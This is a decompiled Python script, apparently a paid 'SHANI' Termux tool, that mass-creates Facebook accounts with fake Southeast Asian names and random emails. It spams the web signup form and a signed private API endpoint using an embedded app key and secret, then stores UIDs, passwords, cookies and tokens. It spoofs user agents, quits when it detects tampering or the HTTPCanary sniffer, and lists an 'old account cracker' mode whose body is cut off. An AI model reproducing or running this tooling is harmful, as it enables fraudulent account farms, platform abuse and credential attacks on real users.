# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode

import os
import re
import time
import uuid
import platform
from datetime import datetime
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from faker import Faker
from fake_useragent import UserAgent
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timedelta
user_key = None
exp = None
left = None
# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []
proxies = {}
folder_path = "/storage/emulated/0"

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;─⃝͓̽Iʈx̽ Sʜ͜͡ʌɴɪ͒ ⪼👀\x07')

# ================= BOOT SCREEN =================

def boot_screen():

    import os, sys, time

    # ===== COLORS =====

    C = '\033[1;96m'
    G = '\033[1;92m'
    Y = '\033[1;93m'
    W = '\033[1;97m'
    GRAY = '\033[1;90m'
    X = '\033[0m'

    # ===== CLEAR FIRST =====

    os.system('clear')

    # ===== SPEEDS =====

    delay_1 = 0.05
    delay_2 = 0.04
    delay_3 = 0.02
    delay_4 = 0.02
    delay_5 = 0.03

    # ===== BOOT LINES =====

    boot_lines = [

        ("┌", "Assalam O Alaikum", G, delay_1),

        ("├", "SYSTEM BOOT", W, delay_2),

        ("├", "Initializing Security Protocols...", GRAY, delay_3),

        ("├", "Loading Modules...", Y, delay_4),

        ("└", "System Ready ✓", G, delay_5)

    ]

    # ===== ANIMATION =====

    for symbol, text, color, delay in boot_lines:

        sys.stdout.write(C + f"{symbol}─[" + X + " ")
        sys.stdout.flush()

        for char in text:

            sys.stdout.write(color + char + X)
            sys.stdout.flush()

            time.sleep(delay)

        sys.stdout.write(C + " ]" + X + "\n")
        sys.stdout.flush()

        time.sleep(0.15)

    # ===== DIRECT NEW PAGE =====

    time.sleep(0.1)

    os.system('clear')
   
# ================= MAIN IMPORTS =================

import os
import sys
import shutil

# ================= COLORS =================

R = '\033[1;91m'
G = '\033[1;92m'
Y = '\033[1;93m'
B = '\033[1;94m'
P = '\033[1;95m'
C = '\033[1;96m'
W = '\033[1;97m'
X = '\033[0m'

# EXTRA COLORS

M = "\033[1;32m"
H = "\033[1;33m"
K = "\033[1;34m"
U = "\033[1;36m"
O = "\033[1;37m"
N = "\033[0m"
# ------------------[ OKS AND CPS AND COOKIE ]-------------------#
def cvt(st, ran):
    try:
        if st == "oks":
            cookie = "c_user=%s;xs=%s;fr=%s;datr=%s;" % (
                ran["c_user"],
                ran["xs"],
                ran["fr"],
                ran["datr"],
            )
        elif st == "cps":
            cookie = "checkpoint=%s;datr=%s;fr=%s;" % (
                ran["checkpoint"],
                ran["datr"],
                ran["fr"],
            )
    except Exception as e:
        cookie = "; ".join([str(x) + "=" + str(y) for x, y in ran])
    return str(cookie)

# ================= SAFE WIDTH =================

term_width = shutil.get_terminal_size((80, 20)).columns

if term_width > 60:
    WIDTH = 60
elif term_width < 56:
    WIDTH = 56
else:
    WIDTH = term_width - 2


# ================= BOX FUNCTIONS =================

def H_LINE():
    return "─" * (WIDTH - 3)


def TOP(title=""):
    if title:
        ansi = re.compile(r'\033\[[0-9;]*m')
        visible = ansi.sub('', title)
        text = f" {title} "
        left = (WIDTH - len(f" {visible} ") - 2) // 2
        right = WIDTH - len(f" {visible} ") - left - 3

        return (
            C
            + "┌"
            + ("─" * left)
            + text
            + ("─" * right)
            + "┐"
            + X
        )

    return C + "┌" + H_LINE() + "┐" + X


def MID():
    return C + "├" + H_LINE() + "┤" + X


def BOTTOM():
    return C + "└" + H_LINE() + "┘" + X


def ROW(text="", color=W):

    clean = str(text)

    if len(clean) > WIDTH - 4:
        clean = clean[:WIDTH - 7] + "..."

    return (
        C + "│ "
        + color
        + clean.ljust(WIDTH - 4)
        + C +"│"
        + X
    )

def ROW_SHORT(text="", color=W):

    clean = str(text)

    return (
        C + "│ "
        + color
        + clean.ljust(WIDTH - 5)
        + C + "│"
        + X
    )

# ================= MENU CLEAR =================

def menu_clear():
    sys.stdout.write("\033[19;0H")
    sys.stdout.write("\033[J")
    sys.stdout.flush()


# ================= LOGO =================

if WIDTH < 53:

    logo = [
        "███████╗██╗  ██╗",
        "██╔════╝██║  ██║",
        "███████╗███████║",
        "╚════██║██╔══██║",
        "███████║██║  ██║",
        "╚══════╝╚═╝  ╚═╝"
    ]

else:

    logo = [
        "███████╗██╗  ██╗ █████╗ ███╗   ██╗██╗",
        "██╔════╝██║  ██║██╔══██╗████╗  ██║██║",
        "███████╗███████║███████║██╔██╗ ██║██║",
        "╚════██║██╔══██║██╔══██║██║╚██╗██║██║",
        "███████║██║  ██║██║  ██║██║ ╚████║██║",
        "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝"
    ]


# ================= MAIN BANNER =================

def ____banner____():

    global user_key, exp, left

    try:
        if not user_key:
            user_key = "LOADING..."
    except:
        user_key = "LOADING..."

    try:
        if not exp:
            exp = "N/A"
    except:
        exp = "N/A"

    try:
        if not left:
            left = "N/A"
    except:
        left = "N/A"

    # ===== TOP VERSION PANEL =====

    print(TOP(f"VERSION : {Y}4.0{C}"))

    # ===== LOGO =====

    for line in logo:
        print(ROW(line.center(WIDTH - 4), G))

    print(MID())

    # ===== INFO =====

    print(ROW("◈ OWNER       : SHANI MALIK", W))
    print(ROW("◈ WHATSAPP    : +923200795589", W))
    print(ROW("◈ TOOL TYPE   : PREMIUM PAID TOOL", W))
    print(ROW(f"◈ DEVICE KEY  : {user_key}", W))
    print(ROW(f"◈ EXPIRY DATE : {exp}", W))
    print(ROW(f"◈ TIME LEFT   : {left}", W))

    print(MID())

    print(
    ROW_SHORT(
        "⚡ SHORTCUTS : CTRL+C Pause | CTRL+Z Stop",
        Y
    )
)

    print(BOTTOM())

    # ===== MAIN MENU TITLE =====

    print(TOP("SHANI - SETUP"))
def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000004', '1000004', '1000004', '1000004', '1000004', '1000004')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100004'):
            return '2010'
        if uid.startswith(('100004', '100004')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''
def clear():
    os.system('clear')
def linex():
    print('\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m')

def BNG_71_():

    while True:

        os.system("clear")

        ____banner____()

        print(ROW("[1] OLD CLONE", G))
        print(ROW("[2] AUTO CREATE FB", G))

        print(BOTTOM())

        choice = input("➤ CHOICE : ")

        if choice in ('1','01'):

            if status != "approved":

                access_denied_block(
                    user_key,
                    status,
                    exp
                )

                return

            old_clone()
            break

        elif choice in ('2','02'):

            if status != "approved":

                access_denied_block(
                    user_key,
                    status,
                    exp
                )

                return

            method()
            break

        else:

            print(R + "INVALID OPTION" + X)

            time.sleep(1)

# ------------------[ FAKE NAME PHILIPPINES ]-------------------#
def fake_philippines():
    first = Faker("en_PH").first_name()
    last = Faker("en_PH").last_name()
    return first, last

# ------------------[ FAKE NAME INDONESIA ]-------------------#
def fake_indonesia():
    first = Faker("id_ID").first_name()
    last = Faker("id_ID").last_name()
    return first, last

# ------------------[ FAKE NAME VIETNAMESE ]-------------------#
def fake_vietnamese():
    first = Faker("vi_VN").first_name()
    last = Faker("vi_VN").last_name()
    return first, last

# ------------------[ DATA EXTRACTOR ]-------------------#
def extractor(data):
    try:
        soup = BeautifulSoup(data, "html.parser")
        data = {}
        for inputs in soup.find_all("input"):
            name = inputs.get("name")
            value = inputs.get("value")
            if name:
                data[name] = value
        return data
    except Exception as e:
        return {"error": str(e)}

    # ------------------[ USER AGENT UA ]-------------------#
from fake_useragent import UserAgent

ua = UserAgent()


def generate_user_agent():
    android_versions = ["9", "10", "11", "12", "13"]
    devices = [
        "Infinix X682C",
        "Redmi Note 9 Pro",
        "V2111 Build/SP1A.210812.003",
        "HLK-AL00 Build/HONORHLK-AL00",
        "ASUS_Z01QD",
        "Redmi 4A Build/MMB29M",
    ]
    browser_engines = [
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
        "AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/",
    ]
    browsers = ["Mobile Safari/537.36", "UCBrowser/11.4.8.1012 Mobile Safari/537.36"]
    aa = "Mozilla/5.0 (Linux; Android"
    b = random.choice(android_versions)
    c = random.choice(devices)
    d = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    e = random.randint(1, 999)
    f = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    g = random.choice(browser_engines)
    h = random.randint(80, 114)
    i = "0"
    j = random.randint(4200, 5900)
    k = random.randint(40, 150)
    l = random.choice(browsers)
    return f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"


def W_ueragent():
    chrome_versions = [(80, 3987, 163), (90, 4430, 212), (100, 4896, 127)]
    webkit_versions = [(537, 36), (537, 36), (537, 36)]
    safari_versions = [500, 600]
    windows_versions = [(10, 0), (10, 1), (11, 0)]
    chrome_version = random.choice(chrome_versions)
    webkit_version = random.choice(webkit_versions)
    safari_version = random.choice(safari_versions)
    windows_version = random.choice(windows_versions)
    is_win64 = random.choice([True, False])
    win64_str = "Win64; x64" if is_win64 else "WOW64"
    user_agent = (
        f"Mozilla/5.0 (Windows NT {windows_version[0]}.{windows_version[1]}; {win64_str}) "
        f"AppleWebKit/{webkit_version[0]}.{webkit_version[1]} (KHTML, like Gecko) "
        f"Chrome/{chrome_version[0]}.{chrome_version[1]}.{chrome_version[2]} Safari/{safari_version}"
    )
    return user_agent


def user_agent():
    devices = [
        "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 9 Pro;FBSV/10]",
        "[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519012;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289140577;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/10]",
        "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1931;FBSV/10]",
        "[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=3.0,width=1080,height=2165};FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBDV/LE2113;FBSV/13]",
        "[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683427;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_GB;FBRV/155327069;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 5;FBSV/8.1.0]",
    ]
    prefix = (
        "[FBAN/FB4A;FBAV/"
        + str(random.randint(11, 80))
        + ".0.0."
        + str(random.randint(9, 49))
        + "."
        + str(random.randint(11, 77))
        + ";FBBV/"
        + str(random.randint(11111111, 99999999))
        + ";"
    )
    ua = prefix + random.choice(devices)
    return ua

# ------------------[ LOCKED/ACTIVE CHECKER ]-------------------#
def lock_checker(uid):
    try:
        response = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal")
        if "Photoshop" in response.text:
            return "Active"
        else:
            return "Locked"
    except Exception as e:
        pass
        return "Error"

# ------------------[ RANDOM STRING ]-------------------#
def generate_random_string(length):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))

# ------------------[ SAVE FOLDER ]-------------------#
folder_path = "/storage/emulated/0/SHANI"

try:
    os.makedirs(folder_path, exist_ok=True)
except:
    folder_path = "SHANI"
    try:
        os.makedirs(folder_path, exist_ok=True)
    except:
        pass

# ------------------[ CONNECTION WAIT ]-------------------#
def wait_conn():
    while True:
        for i in range(60, 0, -1):
            sys.stdout.write(f"\r\033[1;31m━▷ Connection Lost! Retrying in {i}s... \033[0m")
            sys.stdout.flush()
            time.sleep(1)
            try:
                requests.get("https://www.google.com", timeout=2)
                sys.stdout.write("\r\033[K\033[1;32m━▷ Connected! Resuming...\033[0m\n")
                return
            except:
                pass
                
def method():
    menu_clear()

    print(ROW("[1] METHOD 1", G))
    print(ROW("[2] METHOD 2", G))

    print(BOTTOM())

    choice = input(
        f"\n{R}➤{W} CHOICE {C}:{Y} {G}➤➤ {X}"
    )

    if choice in ("1", "01"):
        auto_create_fb_method_1_()
        menu_clear()

    elif choice in ("2", "02"):
        auto_create_fb_method_2_()
        menu_clear()

    else:
        print(f"\n{R}⚠ INVALID OPTION{X}")
        time.sleep(1)
        return method()

# ------------------[ METHOD 1 ]-------------------#
def auto_create_fb_method_1_() -> None:
    menu_clear()

    print(TOP("METHOD 1"))

    print(ROW("[1] NAME PHILIPPINE", G))
    print(ROW("[2] NAME INDONESIA", G))
    print(ROW("[3] NAME VIETNAMESE", G))

    print(BOTTOM())

    ethan_username = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
    print(BOTTOM())
    menu_clear()

    print(TOP("PASSWORD TYPE"))

    print(ROW("[1] AUTO PASSWORD", G))
    print(ROW("[2] MANUAL PASSWORD", G))

    print(BOTTOM())

    ethan_password = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
    print(BOTTOM())

    if ethan_password in ["2", "02"]:
        pasw2 = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER CUSTOM PASSWORD : ")
        print(BOTTOM())

    menu_clear()

    print(TOP("STATUS INFO"))

    print(ROW("◈ TOTAL UID : 50000", G))
    print(ROW("◈ IF NO RESULT [ON/OFF] AIRPLANE MODE", Y))

    print(BOTTOM())

    for make in range(50000):
        global oks, cps

        boos = random.choice([P, M, H, K, B, U, O, N])

        sys.stdout.write(
            f"\r\r\033[1;37m<[{boos}SHANI-MALIK\033[1;37m]<🖤>[{make + 1}|\033[1;32m{len(oks)}\033[1;37m]> "
        )
        sys.stdout.flush()
        # sys.stdout.write(f"\r\r\033[1;37m[SHANI-CREATE] {make+1}\033[1;37m|\033[1;32mOK-:{len(oks)}\033[1;37m");sys.stdout.flush()
        ses = requests.Session()
        response = ses.get(
            url="https://x.facebook.com/reg",
            params={
                "_rdc": "1",
                "_rdr": "",
                "wtsid": "rdr_0t3qOXoIHbMS6isLw",
                "refsrc": "deprecated",
            },
        )
        mts = ses.get("https://x.facebook.com").text
        m_ts = re.search(r'name="m_ts" value="(.*?)"', str(mts)).group(1)
        formula = extractor(response.text)
        if ethan_username in ["1", "01"]:
            firstname, lastname = fake_philippines()
        if ethan_username in ["2", "02"]:
            firstname, lastname = fake_indonesia()
        if ethan_username in ["3", "03"]:
            firstname, lastname = fake_vietnamese()
        domain = random.choice(
            [
                "gmail.com",
                "hotmail.com",
                "outlook.com",
                "yahoo.com",
                "myyahoo.com",
                "protonmail.com",
                "live.com",
                "rocket.com",
            ]
        )
        email2 = (
            f"{firstname.lower()}{lastname.lower()}{random.randint(10, 99)}@{domain}"
        )
        if ethan_password in ["1", "01"]:
            pasw2 = f"{firstname.lower()}{lastname.lower()}"
        # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] NAME   : {firstname} {lastname}")
        # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] EMAIL  : {email2}")
        cookies = None
        payload1 = None
        payload2 = {}
        payload3 = {}
        payload3 = {
            "ccp": "2",
            "reg_instance": str(formula["reg_instance"]),
            "submission_request": "true",
            "helper": "",
            "reg_impression_id": str(formula["reg_impression_id"]),
            "ns": "1",
            "zero_header_af_client": "",
            "app_id": "103",
            "logger_id": str(formula["logger_id"]),
            "field_names[0]": "firstname",
            "firstname": firstname,
            "lastname": lastname,
            "field_names[1]": "birthday_wrapper",
            "birthday_day": str(random.randint(1, 28)),
            "birthday_month": str(random.randint(1, 12)),
            "birthday_year": str(random.randint(1992, 2009)),
            "age_step_input": "",
            "did_use_age": "false",
            "field_names[2]": "reg_email__",
            "reg_email__": email2,
            "field_names[3]": "sex",
            "sex": "2",
            "preferred_pronoun": "",
            "custom_gender": "",
            "field_names[4]": "reg_passwd__",
            "name_suggest_elig": "false",
            "was_shown_name_suggestions": "false",
            "did_use_suggested_name": "false",
            "use_custom_gender": "false",
            "guid": "",
            "pre_form_step": "",
            "encpass": "#PWD_BROWSER:0:{}:{}".format(
                str(time.time()).split(".")[0], pasw2
            ),
            "submit": "Sign Up",
            "fb_dtsg": "NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0",
            "jazoest": str(formula["jazoest"]),
            "lsd": str(formula["lsd"]),
            "__dyn": "1ZaaAG1mxu1oz-l0BBBzEnxG6U4a2i5U4e0C8dEc8uwcC4o2fwcW4o3Bw4Ewk9E4W0pKq0FE6S0x81vohw5Owk8aE36wqEd8dE2YwbK0iC1qw8W0k-0jG3qaw4kwbS1Lw9C0le0ue0QU",
            "__csr": "",
            "__req": "p",
            "__fmt": "1",
            "__a": "AYkiA9jnQluJEy73F8jWiQ3NTzmH7L6RFbnJ_SMT_duZcpo2yLDpuVXfU2doLhZ-H1lSX6ucxsegViw9lLO6uRx31-SpnBlUEDawD_8U7AY4kQ",
            "__user": "0",
        }
        header1 = {
            "Host": "m.facebook.com",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": W_ueragent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "dnt": "1",
            "X-Requested-With": "mark.via.gp",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "dpr": "1.75",
            "viewport-width": "980",
            "sec-ch-ua": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-platform-version": '""',
            "sec-ch-ua-model": '""',
            "sec-ch-ua-full-version-list": "",
            "sec-ch-prefers-color-scheme": "dark",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        }
        reg_url = "https://www.facebook.com/reg/submit/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0NDE0OTk2LCJjYWxsc2l0ZV9pZCI6OTA3OTI0NDAyOTQ4MDU4fQ%3D%3D&multi_step_form=1&skip_suma=0&shouldForceMTouch=1"
        while True:
            try:
                py_submit = ses.post(reg_url, data=payload3, headers=header1, proxies=proxies)
                break
            except:
                wait_conn()
        if "c_user" in py_submit.cookies:
            # first_cok = ses.cookies.get_dict()
            # uid = str(first_cok["c_user"])
            # cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
            cok = ";".join([k + "=" + v for k, v in ses.cookies.get_dict().items()])
            uid = re.findall("c_user=(.*?);", cok)[0]
            coki = (
                cvt("oks", ses.cookies.get_dict())
                + "dpr=2;locale=en_US;wd=950x1835;m_page_voice="
                + uid
            )
            print("\r\033[1;32m<[SHANI-OK]> " + uid + " | " + pasw2 + "\033[1;37m")
            # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+coki)
            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] UID    : {uid}")
            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] PASS   : {pasw2}")
            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] COOKIE : {coki}")
            # linex()
            file_path_ok = os.path.join(folder_path, "SHANI-CREATE-OK.txt")
            file_path_cookies = os.path.join(folder_path, "SHANI-CREATE-COOKIE.txt")
            with (
                open(file_path_ok, "a") as file_ok,
                open(file_path_cookies, "a") as file_cookies,
            ):
                file_ok.write(uid + " | " + pasw2 + "\n")
                file_cookies.write(uid + " | " + pasw2 + " |-----> " + coki + "\n")
            oks.append(uid)
        else:
            # print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID")
            # linex()
            cps.append("CP")

# ------------------[ METHOD 2 ]-------------------#
def auto_create_fb_method_2_() -> None:
    menu_clear()
    print(TOP("METHOD 2"))

    print(ROW("[1] NAME PHILIPPINE", G))
    print(ROW("[2] NAME INDONESIA", G))
    print(ROW("[3] NAME VIETNAMESE", G))

    print(BOTTOM())
    ethan_username = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
    print(BOTTOM())
    menu_clear()
    print(TOP("PASSWORD TYPE"))

    print(ROW("[1] AUTO PASSWORD", G))
    print(ROW("[2] MANUAL PASSWORD", G))

    print(BOTTOM())
    ethan_password = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
    print(BOTTOM())
    menu_clear()
    if ethan_password in ["2", "02"]:
        pasw2 = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER CUSTOM PASSWORD : ")
        print(BOTTOM())
    for make in range(1000):
        boos = random.choice([P, M, H, K, B, U, O, N])
        
        ses = requests.Session()
        fake = Faker()
        api_key = "882a8490361da98702bf97a021ddc14d"
        secret = "62f8ce9f74b12f84c123cc23437a4a32"
        gender = random.choice(["M", "F"])
        if ethan_username in ["1", "01"]:
            firstname, lastname = fake_philippines()
        if ethan_username in ["2", "02"]:
            firstname, lastname = fake_indonesia()
        if ethan_username in ["3", "03"]:
            firstname, lastname = fake_vietnamese()
        domain = random.choice(
            [
                "gmail.com",
                "hotmail.com",
                "outlook.com",
                "yahoo.com",
                "myyahoo.com",
                "protonmail.com",
                "live.com",
                "rocket.com",
            ]
        )
        email2 = (
            f"{firstname.lower()}{lastname.lower()}{random.randint(10, 99)}@{domain}"
        )
        if ethan_password in ["1", "01"]:
            pasw2 = f"{firstname.lower()}{lastname.lower()}"
        time.sleep(5)
        print(ROW(f"◈ NAME  : {firstname} {lastname}", G))
        print(ROW(f"◈ EMAIL : {email2}", Y))
        print(ROW("◈ SUCCESSFULLY CHECKPOINT ID", R))
        print(BOTTOM())
        birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
        req = {
            "api_key": api_key,
            "attempt_login": True,
            "birthday": birthday.strftime("%Y-%m-%d"),
            "client_country_code": "US",
            "fb_api_caller_class": "com.facebook.registration.protocol.RegisterAccountMethod",
            "fb_api_req_friendly_name": "registerAccount",
            "firstname": firstname,
            "format": "json",
            "gender": gender,
            "lastname": lastname,
            "email": email2,
            "locale": "en_US",
            "method": "user.register",
            "password": pasw2,
            "reg_instance": generate_random_string(32),
            "return_multiple_errors": True,
        }
        headers = {"User-Agent": user_agent()}
        sorted_req = sorted(req.items(), key=lambda x: x[0])
        sig = "".join(f"{k}={v}" for k, v in sorted_req)
        ensig = hashlib.md5((sig + secret).encode()).hexdigest()
        req["sig"] = ensig
        api_url = "https://b-api.facebook.com/method/user.register"
        while True:
            try:
                response = ses.post(api_url, data=req, headers=headers, proxies=proxies)
                break
            except:
                wait_conn()
        reg = response.json()
        uid = reg.get("new_user_id")
        token = reg.get("session_info", {}).get("access_token")
        if uid:
            status = lock_checker(uid)
            if status == "Locked":
                print(
                    f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID"
                )
            else:
                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] UID    : {uid}")
                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] PASS   : {pasw2}")
                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] TOKEN  : {token}")
                print(BOTTOM())
                ok.append(uid)
        else:
            cps.append("CP")
            sys.stdout.write(
            f"\n\033[1;37m<[{boos}SHANI-MALIK\033[1;37m]<🖤>[{make + 1}|\033[1;32m{len(oks)}\033[1;37m]>\r"
            )
            sys.stdout.flush()
            
def old_clone():

    menu_clear()

    print(TOP("OLD ACCOUNT CRACKER"))

